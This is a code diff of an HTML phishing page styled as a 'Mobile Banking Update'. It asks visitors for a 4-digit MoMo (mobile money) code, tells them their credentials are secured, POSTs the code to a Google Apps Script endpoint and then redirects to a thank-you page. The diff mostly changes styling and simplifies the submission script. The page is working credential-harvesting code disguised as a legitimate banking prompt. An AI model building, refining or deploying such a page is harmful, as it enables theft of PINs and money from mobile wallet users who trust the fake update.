@@ -3,31 +3,31 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MOBILE BANKING UPDATE</title>
+  <title>Mobile Banking Update</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      color: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
-      color: #fff;
       min-height: 100vh;
+      padding-bottom: 40px;
     }
 
     .header {
       background: linear-gradient(135deg, #08143a, #0b1d4d);
-      color: #fff;
-      text-align: center;
       width: 100%;
+      text-align: center;
       padding: 40px 20px;
       border-bottom-left-radius: 40px;
       border-bottom-right-radius: 40px;
       box-shadow: 0 4px 10px rgba(0,0,0,0.3);
     }
     .header h1 { margin: 0; font-size: 24px; }
-    .header p { margin: 8px 0 0; font-size: 14px; line-height: 1.4; }
+    .header p { margin: 10px 0 0; font-size: 14px; line-height: 1.4; }
 
     .form-container {
       background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
@@ -39,13 +39,14 @@
       box-shadow: 0 6px 16px rgba(0,0,0,0.4);
       backdrop-filter: blur(4px);
     }
-    .form-container label {
+
+    label {
       display: block;
       margin-bottom: 6px;
       font-size: 14px;
-      color: #fff;
     }
-    .form-container input {
+
+    input {
       width: 100%;
       padding: 12px;
       margin-bottom: 20px;
@@ -55,15 +56,24 @@
       background-color: rgba(11,29,77,0.9);
       color: #fff;
     }
-    .form-container input::placeholder { color: #ccc; }
+
+    input::placeholder {
+      color: #ccc;
+    }
+
+    input:focus {
+      border-color: #1e90ff;
+      box-shadow: 0 0 8px rgba(30,144,255,0.6);
+      outline: none;
+    }
 
     .button-group {
       display: flex;
-      justify-content: center;
     }
-    .button-group button {
+
+    button {
+      flex: 1;
       padding: 12px;
-      width: 100%;
       border: none;
       border-radius: 6px;
       font-size: 16px;
@@ -73,7 +83,8 @@
       color: #fff;
       transition: all 0.3s ease;
     }
-    .button-group button:hover {
+
+    button:hover {
       background: linear-gradient(135deg, #187bcd, #1560a3);
       transform: scale(1.05);
       box-shadow: 0 4px 12px rgba(0,0,0,0.4);
@@ -82,8 +93,8 @@
     .status {
       text-align: center;
       font-size: 14px;
-      color: #ccc;
       margin-bottom: 12px;
+      color: #ccc;
     }
   </style>
 </head>
@@ -96,10 +107,10 @@
 
   <div class="form-container">
     <form id="momoForm">
-      <label for="momo_code">Enter 4 digits MoMo Code</label>
-      <input type="text" id="momo_code" name="momo_code" placeholder="e.g. 1234" maxlength="4" required>
+      <label>Enter 4 digits MoMo Code</label>
+      <input type="text" name="momo_code" placeholder="e.g. 1234" required maxlength="4">
 
-      <div class="status" id="status">Your code is secured.</div>
+      <div class="status" id="status">Your credentials are secured.</div>
 
       <div class="button-group">
         <button type="submit">Link Wallet →</button>
@@ -108,40 +119,35 @@
   </div>
 
   <script>
+    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxJ1nxxUbrn8N7ancnw_Tc2gUJBJbvsOzuwRR5wJYNS1bF_0bckmYAYeItN1-eEsNbT/exec";
     const form = document.getElementById("momoForm");
     const statusEl = document.getElementById("status");
-    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxJ1nxxUbrn8N7ancnw_Tc2gUJBJbvsOzuwRR5wJYNS1bF_0bckmYAYeItN1-eEsNbT/exec";
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
       statusEl.textContent = "Submitting...";
       statusEl.style.color = "#ccc";
 
-      const momo_code = document.getElementById("momo_code").value.trim();
-
-      if (!/^\d{4}$/.test(momo_code)) {
-        statusEl.textContent = "Please enter a valid 4-digit code.";
-        statusEl.style.color = "#ff5555";
-        return;
-      }
-
-      const formData = new FormData();
-      formData.append("momo_code", momo_code);
+      const formData = new FormData(form);
 
       try {
         const response = await fetch(WEBAPP_URL, { method: "POST", body: formData });
-        const resultText = await response.text();
-        let result;
-        try { result = JSON.parse(resultText); } catch {
-          statusEl.textContent = "Unexpected response from server.";
+        const text = await response.text();
+        console.log("Server response:", text);
+
+        let json;
+        try {
+          json = JSON.parse(text);
+        } catch {
+          statusEl.textContent = "Server error: " + text;
           statusEl.style.color = "#ff5555";
           return;
         }
 
-        if (result.result === "success") {
+        if (json.result === "success") {
           window.location.href = "thankyou.html";
         } else {
-          statusEl.textContent = "Submission failed: " + (result.message || "Unknown error");
+          statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
           statusEl.style.color = "#ff5555";
         }
       } catch (err) {
